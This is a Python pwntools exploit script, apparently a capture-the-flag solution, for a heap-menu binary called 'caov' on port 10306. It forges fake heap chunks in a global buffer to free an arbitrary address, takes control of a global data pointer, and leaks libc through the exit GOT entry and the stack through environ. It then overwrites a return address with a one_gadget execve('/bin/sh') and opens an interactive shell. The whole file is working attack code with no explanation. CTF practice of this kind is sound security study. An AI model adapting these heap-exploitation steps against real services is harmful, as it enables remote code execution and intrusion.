from pwn import *

def show():
	p.recvuntil("Your choice: ")
	p.sendline("1")
def edit(name,length,k,v):
	p.recvuntil("Your choice: ")
	p.sendline("2")
	p.recvuntil("Enter your name: ")
	p.sendline(name)
	p.recvuntil("New key length: ")
	p.sendline(str(length))
	p.recvuntil("Key: ")
	p.sendline(k)
	p.recvuntil("Value: ")
	p.sendline(str(v))
def main(host,port=10306):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./caov")
		p = process("./caov",env={'LD_PRELOAD':'./libc.so.6'})
		gdb.attach(p,"b *0x00000000004014CF")
	p.recvuntil("Enter your name: ")
	p.sendline("a")
	p.recvuntil("Please input a key: ")
	p.sendline("b"*0x6)
	p.recvuntil("Please input a value: ")
	p.sendline("123")
	
	name_addr = 0x00000000006032C0
	
	#free arbitrary addr
	
	payload = "\x00"*0x10
	payload += p64(0) + p64(0x71)
	payload = payload.ljust(0x60,"\x00")
	payload += p64(name_addr+0x20) + p64(0)
	payload += "\x00"*0x10
	payload += p64(0) + '\x21'
	
	
	edit(payload,0x20,"A"*0x16,0xafe)
	
	payload = "\x00"*0x10
	payload += p64(0)+p64(0x71)
	payload += p64(name_addr-0x3b)
	
	
	payload2 = "*"*5
	
	edit(payload,0x60,payload2,0xaaaaaa)
	
	#now we control the global D
	
	payload = p64(elf.got["exit"])
	
	edit(payload,0x62,"\x00"*0xb+p64(name_addr),0x1)
	
	p.recvuntil("Your data info after editing:")
	p.recvuntil("Key: ")
	libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x3a030
	info("libc : " + hex(libc.address))
	
	# 0x45216	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# rax == NULL

	# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	# [rsp+0x30] == NULL

	# 0xef6c4	execve("/bin/sh", rsp+0x50, environ)
	# constraints:
	# [rsp+0x50] == NULL

	# 0xf0567	execve("/bin/sh", rsp+0x70, environ)
	# constraints:
	# [rsp+0x70] == NULL
	
	one_gadget =0x45216
	
	info("one shot : " + hex(libc.address+one_gadget))
	
	
	payload = p64(libc.symbols["environ"])
	
	p.recvuntil("Your choice: ")
	p.sendline("2")
	p.recvuntil("Enter your name: ")
	p.sendline(payload)
	p.recvuntil("New key length: ")
	p.sendline(str(0))
	
	p.recvuntil("Your data info after editing:")
	p.recvuntil("Key: ")
	ret_addr = u64(p.recv(6).ljust(8,"\x00"))-0xf0
	info("stack : " + hex(ret_addr))
	
	edit(p64(ret_addr),0x6,p64(one_gadget+libc.address)[:6],0)
	
	p.recvuntil("Your choice: ")
	p.sendline("3")
	
	p.interactive()
	
if __name__ == "__main__":
	elf = ELF("./caov",checksec=False)
	libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])
